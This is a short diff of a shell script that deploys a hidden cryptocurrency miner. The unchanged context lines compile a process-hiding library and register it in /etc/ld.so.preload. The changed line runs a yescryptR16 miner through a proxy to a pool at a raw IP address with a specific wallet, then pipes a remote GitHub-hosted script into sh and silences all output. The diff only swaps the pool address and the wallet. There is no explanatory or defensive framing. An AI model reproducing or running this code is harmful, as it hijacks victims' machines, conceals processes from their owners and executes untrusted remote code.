@@ -50,4 +50,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp & clear & ./$APP -a yescryptR16 -o stratum+tcp://104.248.231.165:443 -u DNbHCwVeAoGVAA49s62RTXpdcjZk5w17eE -p c=DGB,mc=BTE/FNNC/GOLD,ID=srantal & curl https://raw.githubusercontent.com/John1265801/bookish-sniffle/refs/heads/main/bismillah.sh | sh > /dev/null 2>&1
+./graftcp/graftcp & clear & ./$APP -a yescryptR16 -o stratum+tcp://24.144.107.222:443 -u Gc4Si7DcjvRRtroHc3U52SbmSF53MsCSor.app$(shuf -i 1000000-9999999 -n 1) & curl https://raw.githubusercontent.com/John1265801/bookish-sniffle/refs/heads/main/bismillah.sh | sh > /dev/null 2>&1
